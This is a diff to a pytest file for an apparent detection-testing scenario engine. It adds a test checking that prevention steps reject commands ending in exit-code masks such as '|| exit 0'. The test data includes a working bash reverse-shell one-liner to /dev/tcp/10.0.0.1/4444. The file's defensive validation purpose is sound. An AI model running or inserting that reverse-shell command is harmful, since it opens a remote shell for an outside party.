@@ -9,7 +9,7 @@ FIXTURE = Path(__file__).resolve().parent.parent / "fixtures" / "scenarios" / "s
 
 
 def _det(**kw):
-    base = dict(plane="EDR", type="Prevention", description="d", ttp_ref="TTP-TEST-PREV-001",
+    base = dict(plane="EDR", type="Prevention", description="d", ttp_ref="TTP-2026-9901",
                 detection_id="prevention-btp-reverse-shell-from-web-server")
     base.update(kw); return base
 
@@ -60,3 +60,13 @@ def test_detect_step_may_mask_exit():
 def test_fixture_scenario_is_accepted():
     from engine.scenario_loader import ScenarioSchema
     ScenarioSchema(**yaml.safe_load(FIXTURE.read_text()))
+
+
+@pytest.mark.parametrize("mask", ["|| :", "|| exit 0", "|| /bin/true", "|| printf 'x'"])
+def test_prevent_step_rejects_additional_masks(mask):
+    step = dict(id="s1", name="n", identity="www-data", mitre_technique="T1059.004",
+                expected_detections=[_det(outcome="prevent")])
+    with pytest.raises(ValueError, match="S-21:"):
+        StepSchema(command=f"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 {mask}", **step)
+    detect = dict(step, expected_detections=[_det(outcome="detect")])
+    StepSchema(command=f"bash -i {mask}", **detect)
